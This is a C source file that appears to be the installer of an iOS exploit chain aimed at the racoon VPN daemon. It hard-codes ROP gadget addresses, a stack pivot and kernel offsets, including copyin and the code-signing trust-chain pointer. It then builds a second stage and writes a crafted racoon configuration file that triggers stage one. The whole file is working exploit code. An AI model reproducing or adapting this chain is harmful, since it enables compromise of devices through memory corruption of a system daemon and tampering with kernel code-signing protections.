#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include "common.h"
#include "stage1.h"
#include "stage2.h"

int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
	offset_struct_t myoffsets;
	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
	myoffsets.lcconf_counter_offset = 0x10c;
	myoffsets.memmove = 0x1aa0b8bb8;
	myoffsets.longjmp = 0x180a817dc;
	myoffsets.stack_pivot = 0x180a81808;	
	myoffsets.mmap = 0x180978c50;
	myoffsets.memcpy = 0x18095a3e8;
	myoffsets.open = 0x1809779ac;
	myoffsets.max_slide = 0x66dc000;
	myoffsets.slide_value = 0x4000;
	myoffsets.pivot_x21 = 0x1990198fc;
	myoffsets.str_buff_offset = 8;
	myoffsets.BEAST_GADGET = 0x1a0478c70;
	myoffsets.BEAST_GADGET_LOADER = 0x1a0478c94;
	myoffsets.BEAST_GADGET_CALL_ONLY = 0x1a0478c90;
	myoffsets.str_x0_gadget = 0x198ba668c;
	myoffsets.str_x0_gadget_offset = 0x28;
	myoffsets.cbz_x0_gadget = 0x198e83c54;
	myoffsets.cbz_x0_x16_load = 0x1b0a9ad30;
	myoffsets.add_x0_gadget = 0x184f6992c;
	myoffsets.fcntl_raw_syscall = 0x180978490;
	myoffsets.rop_nop = 0x180a8181c;
	myoffsets.new_cache_addr = 0x1c0000000;
	myoffsets.cache_text_seg_size = 0x30000000;
	myoffsets.errno_offset = 0x1f167dfe0;
	myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
	myoffsets.stage2_max_size = 0x200000;
	myoffsets.thread_max_size = 0x10000;
	myoffsets.ipr_size = 8;
	myoffsets.rootdomainUC_vtab = 0xfffffff00708d870;
	myoffsets.itk_registered = 0x2f0;
	myoffsets.is_task = 0x28;
	myoffsets.copyin = 0xfffffff0071a05ac;
	myoffsets.gadget_add_x0_x0_ret = 0xfffffff0073b71e4;
	myoffsets.swapprefix_addr = 0xfffffff0075898bc;
	myoffsets.trust_chain_head_ptr = 0xfffffff007687428;
	myoffsets.stage3_fileoffset = 0;
	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
	myoffsets.stage3_size = 0x10000;
	myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x7fa8;
	myoffsets.stage3_CS_blob = 49264;
	myoffsets.stage3_CS_blob_size = 640;

	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
	stage2(&myoffsets,"/private/etc/racoon/");

	// TODO: make sure that the directory exists
	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
	stage1(f,&myoffsets);
	close(f);

	return 0;
}
